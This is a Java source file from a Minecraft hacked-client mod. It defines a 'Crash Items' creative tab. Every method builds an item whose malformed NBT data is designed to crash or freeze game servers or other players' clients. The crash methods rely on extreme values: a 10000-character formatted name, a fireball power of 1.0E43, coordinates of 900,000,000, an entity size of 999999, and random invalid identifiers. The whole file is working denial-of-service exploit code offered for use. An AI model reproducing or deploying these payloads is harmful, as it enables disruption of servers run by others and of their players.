package de.vandalismdevelopment.vandalism.creativetab.impl;

import de.vandalismdevelopment.vandalism.Vandalism;
import de.vandalismdevelopment.vandalism.creativetab.CreativeTab;
import de.vandalismdevelopment.vandalism.feature.impl.module.impl.exploit.ExploitFixerModule;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Collection;

public class CrashItemsCreativeTab extends CreativeTab {

    public CrashItemsCreativeTab() {
        super(
                Text.literal("Crash Items"),
                new ItemStack(Items.BARRIER)
        );
    }

    @Override
    public Collection<ItemStack> entries() {
        final Collection<ItemStack> current = super.entries();
        final ExploitFixerModule exploitFixerModule = Vandalism.getInstance().getModuleRegistry().getExploitFixerModule();
        current.add(createItem(createClientCrashExperience(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Client Crash Experience"), "NekosAreKawaii"));
        current.add(createItem(createServerCrashEntity(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Crash Entity"), "TaxEvasiqn"));
        current.add(createItem(createClientCrashArea(), Text.literal(Formatting.RED + "Client Crash Area"), "NekosAreKawaii"));
        current.add(createItem(createSodiumClientFreezeEntity(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Sodium Freeze Entity"), "NekosAreKawaii"));
        current.add(createItem(createInstantCrashSculkItem(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Instant Crash Block"), "Putzefurcht"));
        if (exploitFixerModule.isEnabled() && exploitFixerModule.blockInvalidIdentifierCrash.getValue()) {
            current.add(createItem(createClientInstantCrashPot(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Instant Crash Pot"), "maniaplay"));
        }

        return current;
    }

    private ItemStack createClientCrashExperience() {
        final ItemStack item = new ItemStack(Items.SHEEP_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();

        final NbtCompound entityTag = new NbtCompound();
        entityTag.putString("CustomName", Text.Serializer.toJson(Text.literal("#".repeat(10000)).formatted(Formatting.DARK_GREEN, Formatting.BOLD, Formatting.UNDERLINE, Formatting.STRIKETHROUGH, Formatting.ITALIC, Formatting.OBFUSCATED)));
        entityTag.putInt("Value", 1337);
        entityTag.putInt("Count", 999999);
        entityTag.putByte("CustomNameVisible", (byte) 1);
        entityTag.putByte("Glowing", (byte) 1);
        entityTag.putByte("HasVisualFire", (byte) 1);
        entityTag.putString("id", "minecraft:experience_orb");

        base.put("EntityTag", entityTag);
        item.setNbt(base);

        return item;
    }

    private ItemStack createServerCrashEntity() {
        final ItemStack item = new ItemStack(Items.BAT_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();

        final NbtCompound entityTag = new NbtCompound();

        final NbtList power = new NbtList();
        power.add(NbtDouble.of(1.0E43));
        power.add(NbtDouble.of(0));
        power.add(NbtDouble.of(0));

        entityTag.put("power", power);

        entityTag.putString("id", "minecraft:small_fireball");
        base.put("EntityTag", entityTag);

        item.setNbt(base);

        return item;
    }

    private ItemStack createClientCrashArea() {
        final ItemStack item = new ItemStack(Items.SALMON_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();

        final NbtCompound entityTag = new NbtCompound();
        entityTag.putFloat("RadiusOnUse", 100f);
        entityTag.putFloat("RadiusPerTick", 1f);
        entityTag.putInt("Duration", 60000);
        entityTag.putFloat("Radius", 100f);
        entityTag.putInt("ReapplicationDelay", 0);
        entityTag.putString("Particle", "elder_guardian");
        entityTag.putString("id", "minecraft:area_effect_cloud");

        base.put("EntityTag", entityTag);
        item.setNbt(base);

        return item;
    }

    private ItemStack createClientInstantCrashPot() {
        final ItemStack item = new ItemStack(Items.DECORATED_POT);
        final NbtCompound base = new NbtCompound();

        final NbtCompound blockEntityTag = new NbtCompound();

        final NbtList sherds = new NbtList();
        sherds.add(NbtString.of(RandomStringUtils.random(5).toLowerCase() + ":" + RandomStringUtils.random(5).toUpperCase()));
        blockEntityTag.put("sherds", sherds);

        base.put("BlockEntityTag", blockEntityTag);
        item.setNbt(base);

        return item;
    }

    private ItemStack createSodiumClientFreezeEntity() {
        final ItemStack item = new ItemStack(Items.BAT_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();

        final NbtCompound entityTag = new NbtCompound();
        entityTag.putFloat("width", 999999F);
        entityTag.putFloat("height", 999999F);
        entityTag.putString("id", "minecraft:interaction");

        base.put("EntityTag", entityTag);
        item.setNbt(base);

        return item;
    }

    public ItemStack createInstantCrashSculkItem() {
        final ItemStack item = new ItemStack(Items.SCULK_CATALYST);
        final NbtCompound base = new NbtCompound();

        final NbtCompound blockEntityTag = new NbtCompound();
        final NbtList cursors = new NbtList();

        final NbtCompound firstCursor = new NbtCompound();
        final NbtList pos = new NbtList();
        pos.add(NbtInt.of(900000000));
        pos.add(NbtInt.of(0));
        pos.add(NbtInt.of(900000000));

        firstCursor.put("pos", pos);
        firstCursor.putInt("charge", 150);

        cursors.add(firstCursor);

        blockEntityTag.put("cursors", cursors);

        base.put("BlockEntityTag", blockEntityTag);

        item.setNbt(base);

        return item;
    }

}
